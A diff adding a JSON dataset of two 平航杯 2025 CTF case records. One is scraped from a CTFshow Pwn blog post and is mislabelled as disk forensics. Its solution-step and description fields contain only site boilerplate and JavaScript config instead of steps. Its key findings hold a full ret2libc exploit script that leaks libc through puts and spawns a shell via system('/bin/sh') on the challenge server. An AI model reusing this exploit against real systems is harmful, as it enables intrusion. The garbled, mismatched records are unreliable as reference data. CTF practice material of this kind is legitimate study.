@@ -1,0 +1,52 @@
+[
+  {
+    "case_id": "平航杯_2025_f79ee4498794905a",
+    "title": "CTFshow-Pwn-10月记录",
+    "category": "磁盘取证",
+    "competition": "平航杯",
+    "year": 2025,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [
+      "文件恢复"
+    ],
+    "description": "CTFshow-Pwn-10月记录 - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1",
+    "solution_steps": [
+      "CTFshow-Pwn-10月记录 - 玫幽倩的小博客\n\n  \n\n\n\n  \n\n  \n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [
+      "from pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;io=remote(&quot;pwn.challenge.ctf.show&quot;,28246)elf=ELF(&quot;./pwn25&quot;)main=elf.symbols[&quot;main&quot;]puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]padding=0x88+4payload1=b&quot;a&quot;*padding+p32(puts_plt)+p32(main)+p32(puts_got)io.sendline(payload1)puts=u32(io.recvuntil(&quot;\\xf7&quot;)[-4:])libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)system=libc_base+libc.dump(&quot;system&quot;)bin_sh=libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2=b&quot;a&quot;*padding+p32(system)+p32(0)+p32(bin_sh)io.sendline(payload2)io.interactive()",
+      "#include &lt;unistd.h&gt;   #include &lt;sys/mmap.h&gt;   int mprotect(const void *start, size_t len, int prot);",
+      ".got.plt",
+      "printf"
+    ],
+    "flags": [],
+    "tags": [
+      "磁盘取证",
+      "CTF",
+      "Writeup"
+    ],
+    "content_hash": "f79ee4498794905a",
+    "source_url": "https://mei-you-qian.github.io/2025/10/31/CTFshow-Pwn-10月记录/index"
+  },
+  {
+    "case_id": "平航杯_2025_dir_2025平航杯初赛",
+    "title": "2025平航杯初赛",
+    "category": "电子取证",
+    "competition": "平航杯",
+    "year": 2025,
+    "difficulty": "medium",
+    "tools_used": [],
+    "techniques": [],
+    "description": "包含 189 张截图的取证案例",
+    "solution_steps": [],
+    "key_findings": [],
+    "flags": [],
+    "tags": [
+      "电子取证",
+      "平航杯"
+    ],
+    "content_hash": "a18bc0476f149863",
+    "source_url": ""
+  }
+]
